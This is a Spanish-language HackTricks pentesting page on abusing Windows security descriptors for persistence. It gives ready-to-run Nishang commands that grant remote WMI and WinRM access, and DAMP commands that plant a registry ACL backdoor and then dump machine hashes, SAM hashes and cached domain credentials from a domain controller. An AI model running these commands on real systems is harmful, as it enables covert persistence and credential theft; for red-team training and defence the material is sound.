# Descriptores de seguridad

{{#include ../../banners/hacktricks-training.md}}

## Descriptores de seguridad

Los descriptores de seguridad de Windows contienen un SID de propietario, un SID de grupo principal, una ACL discrecional (DACL) que controla el acceso y una ACL del sistema (SACL) utilizada principalmente para auditorías. Security Descriptor Definition Language (SDDL) es la representación textual; una cadena ACE tiene el formato `ace_type;ace_flags;rights;object_guid;inherit_object_guid;account_sid;`.<sup>[[1]](#references)[[4]](#references)</sup>

Un descriptor de seguridad almacena quién es el propietario de un objeto protegible y qué principals tienen permitidos o denegados derechos específicos sobre él. Si un atacante puede modificar una DACL, puede conceder a un principal con pocos privilegios derechos que normalmente requieren un rol administrativo.

Esto hace que los descriptores modificados de forma limitada sean útiles para la persistencia: la cuenta permanece fuera de los grupos privilegiados obvios y conserva el acceso a una superficie de administración específica. Conserva el descriptor original antes de realizar pruebas para poder revertir el cambio exactamente.

### Acceso a WMI

Puedes dar a un usuario acceso para **ejecutar WMI de forma remota** [**usando esto**](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)<sup>[[2]](#references)</sup>:
```bash
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Verbose
Set-RemoteWMI -UserName student1 -ComputerName dcorp-dc -Namespace 'root\cimv2' -Remove -Verbose # Remove
```
### Acceso a WinRM

Concede a un usuario acceso a un endpoint remoto de PowerShell/WinRM con la función `Set-RemotePSRemoting` de Nishang:<sup>[[2]](#references)</sup>
```bash
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Verbose
Set-RemotePSRemoting -UserName student1 -ComputerName <remotehost> -Remove #Remove
```
### Acceso remoto a hashes

DAMP puede crear una puerta trasera de ACL del registro que posteriormente permite la recuperación remota del hash de la cuenta de máquina, los hashes SAM locales y las credenciales de dominio en caché. Conceder estos derechos limitados a una cuenta que, por lo demás, es ordinaria —especialmente contra un controlador de dominio— proporciona una persistencia potente sin pertenecer a un grupo privilegiado.<sup>[[3]](#references)</sup>
```bash
# allows for the remote retrieval of a system's machine and local account hashes, as well as its domain cached credentials.
Add-RemoteRegBackdoor -ComputerName <remotehost> -Trustee student1 -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local machine account hash for the specified machine.
Get-RemoteMachineAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the local SAM account hashes for the specified machine.
Get-RemoteLocalAccountHash -ComputerName <remotehost> -Verbose

# Abuses the ACL backdoor set by Add-RemoteRegBackdoor to remotely retrieve the domain cached credentials for the specified machine.
Get-RemoteCachedCredential -ComputerName <remotehost> -Verbose
```
Consulta [**Silver Tickets**](silver-ticket.md) para saber cómo podrías usar el hash de la cuenta de equipo de un controlador de dominio.

## References

- [1] [Lenguaje de definición de descriptores de seguridad - Microsoft Learn](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-definition-language)
- [2] [nishang - Set-RemoteWMI.ps1](https://github.com/samratashok/nishang/blob/master/Backdoors/Set-RemoteWMI.ps1)
- [3] [DAMP - Proyecto de modificación de ACL discrecionales](https://github.com/HarmJ0y/DAMP)
- [4] [Microsoft Learn — Formato de cadena del descriptor de seguridad](https://learn.microsoft.com/en-us/windows/win32/secauthz/security-descriptor-string-format)
{{#include ../../banners/hacktricks-training.md}}
